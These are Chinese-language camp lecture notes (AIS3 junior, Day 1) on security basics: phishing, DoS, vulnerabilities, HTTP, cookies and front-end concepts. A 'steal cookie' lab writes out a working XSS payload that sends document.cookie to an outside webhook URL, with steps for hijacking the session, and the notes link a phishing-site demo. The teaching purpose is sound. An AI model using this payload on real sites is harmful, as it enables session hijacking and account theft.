---
title: AIS3 junior DAY1-網路概論
date: 2024-08-18 14:28:43
tags: 共筆筆記
categories: 2024 AIS3 junior
copyright: false
---
## 甚麼是資訊安全
- 資安三要素
    - C 機密性
        - 看到不該看的
    - I 完整性
        - 資料是錯誤的
    - A 可用性
        - 讓你用不了服務
## 甚麼是駭客
- 熱衷於電腦系統技術研究的專家
- 白帽
    - 協助確認組織弱點
    - 主動告知弱點所在
    - 專注弱點修復技術
- 灰帽
    - 介於白與黑之間
    - 專注於利益與目標
- 黑帽
    - 竊取機密
    - 惡意攻擊
    - 侵害隱私
- 容易成為攻擊目標的原因
    - 商業利益
    - 好玩 / 挑戰性
    - 政治因素
    - 研究目的
    - 個資
- 駭客的攻擊目標
    - 人
        - 社交工程：針對人性漏洞造成的危害
        - 例如：釣魚、詐騙
    - 系統
- 被攻擊後的影響
    - 資料外洩 / 系統受損
    - 名聲受損

## 資安事件
### 烏俄戰爭
- 展現出了第四大戰場 -- 資訊 ( 史上最大規模 )
    - 情報戰
    - 輿情戰
    - 資訊攻擊戰
### 免費線上真人直播
http://insecam.org
- 沒有修改預設的 webcam 帳號密碼
### 每天的網路生活
- 瀏覽網站 --> 釣魚網站
- 收發信件 --> 釣魚信件
    - ~~中華郵政又欠費~~
- 通訊與文書
    - 惡意檔案
    - 資料外洩
    - 社交工程，股票推銷、測試遊戲
- 影音娛樂 --> 病毒、詐騙


## 怎麼利用個資
- 家
    - 家人的身分證、生日
- 公司
    - 員工進入專案、系統的權限
- 學校
    - 同學的帳號密碼
## 攻擊與保護
### 釣魚網站
- 吸引人
    - 跳樓大拍賣，全場兩折起
- 流程：
    1. 駭客製作釣魚網站
    2. 受害者瀏覽
    3. 觸發特定程式碼(JS)
    4. 叫你登入社交帳號
    5. booooom 資料給駭客囉
### 如何保護自己
- 開啟 2FA / TFA
- 注意網址是否怪怪的
    - 或網站內容繁簡體混合
- 確認訊息真確性
    - 165
- 工具
    - [virustotal](https://www.virustotal.com/gui/home/upload)
        - 幫你確認上傳的檔案 / 網站有沒有毒
### 如何製作釣魚網站
- 網站組成的原理
    - 前端
        - 畫面呈現
        - 使用者互動
        - HTML
            - 定義資料
            - `<form>` 表單，填寫資料
                - action 定義表單要傳送的位置 
        - CSS
            - 裝飾畫面
        - JavaScript
            - 呈現互動
    - 後端
        - 邏輯處理
        - 資料傳輸與儲存
    - 實作
        - [jsfiddel](https://jsfiddle.net/)
        - [釣魚網站專案](https://github.com/fdff87554/phishing_demo)
        - [Webhook.site](https://webhook.site/#!/view/2e83c6ff-f551-48b2-96ef-0ea32022d4b9)


## 對系統的攻擊
- DoS 阻斷服務攻擊
    - 一個人把門口卡死
    - 網路攻擊手法
    - 使目標電腦的網路或系統資源耗盡，使服務暫時中斷或停止，導致其他使用者無法正常使用

- DDoS 分散式阻斷服務攻擊
    - 一群人把門口堵死
    - 同上只是比較多攻擊用電腦(被感染的殭屍電腦)

- 終極目標：RCE (Remote Code Execution)


## bug v.s. 漏洞
- bug：因為一些錯誤導致系統運作有問題
- 如果bug會造成
    - 敏感資料外洩
    - 資料遺失
    - ...
    - 那他就會變成漏洞
- 怎麼找到漏洞
    - [OWASP Top 10](https://owasp.org/Top10/zh_TW/)
    - [CVE](https://cve.mitre.org/)
    - [Hitcon ZeroDay](https://zeroday.hitcon.org/)
    - [hackerone](https://www.hackerone.com/)

## 攻擊網站的步驟
1. 了解網站架構規模
2. 整理收集可用資料
3. 針對網站進行攻擊
    - 竊取網站資料
    - 安裝定時炸彈 

## 如何看到一個網站
- 瀏覽器
    - 只是一個媒介
- wget
- curl
- 只要有HTTP request 和 response就可以跟網站互動
- 輸入網址後發生什麼
    1. 找到路：路由routing 
    2. 目的地 ip address 
        - 網址經由DNS解析 --> ip address
    3. 封包封裝 / 解封裝

> HTTP 是無狀態協定

- Cookie
	- 簡易的身份驗證
	- 幫無狀態的HTTP紀錄有狀態的資訊

## 在前端裡面可以了解什麼
### HTML
- 找版本資訊
    - 特殊套件、模板
- 找註解
    - 隱藏資料
    
### CSS
- 利用請求，屬性來偷資料
	- css injction

### JavaScript
javascript = 程式語言 + DOM + BOM
- DOM
    - 你輸入甚麼我輸出什麼
    - Document Object Model
    - 控制網頁相關內容的
- BOM
    - JS 操控瀏覽器
    - 例如彈出視窗

### 偷Cookie Lab
[練習網頁](http://lab.crazyfirelee.tw)
換成自己的網址的部分改成你 webhook.site 的網址
```bash=
<script>new Image().src="換成自己的網址"+"/"+document.cookie</script>
```

1. 把上面那串丟進練習網頁的搜尋框 --> 得到網址
2. 拿這段網址去釣別人的cookie
3. 回到webhook拿到cookie (收到的網址後段的PHPSESSID)
4. 到練習網頁f12/storage/cookies的地方改PHPSESSID

## Burp Suite
- 攔截瀏覽器收到的封包
- 修改從瀏覽器傳送出的封包
	- 完全繞過前端的過濾
- 紀錄和伺服器互動的全部過程

## Linux 基本操作
- grep
	- 有人使用 `grep -r AIS3_Junior` 偷 Flag
- 權限
	- 在`ls -al`裡可以看到 rwxrwxrwx，三個 rwx 分別為擁有者/群組/其他人，r 代表閱讀、w 代表修改、x 代表執行
- 加密
	- 哈希值
		- MD5 (不再安全)
- 記憶指令使用紀錄
	- .zhs_history